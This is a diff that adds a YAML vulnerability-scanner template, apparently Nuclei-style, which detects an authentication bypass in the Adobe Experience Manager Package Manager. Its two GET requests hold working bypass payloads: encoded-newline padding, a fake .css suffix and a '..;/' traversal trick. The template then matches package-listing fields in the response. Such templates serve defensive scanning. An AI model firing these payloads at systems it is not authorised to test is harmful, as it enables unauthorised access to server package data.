@@ -1,0 +1,56 @@
+id: aem-crx-bypass
+brief:
+    title: AEM Package Manager - Authentication Bypass
+    by: dhiyaneshDK
+    level: critical
+    about: Adobe Experience Manager Package Manager is susceptible to a hard to exploit authentication bypass issue. This issue only potentially impacts AEM on-premise or AEM as a Managed Service if default s...
+    label:
+        - aem
+        - adobe
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true'
+      head:
+        Accept-Encoding: gzip, deflate
+        Referer: '{{BaseURL}}'
+      signs:
+        - "on": word
+          has:
+            - buildCount
+            - downloadName
+            - acHandling
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/content/..;/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true'
+      head:
+        Accept-Encoding: gzip, deflate
+        Referer: '{{BaseURL}}'
+      signs:
+        - "on": word
+          has:
+            - buildCount
+            - downloadName
+            - acHandling
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
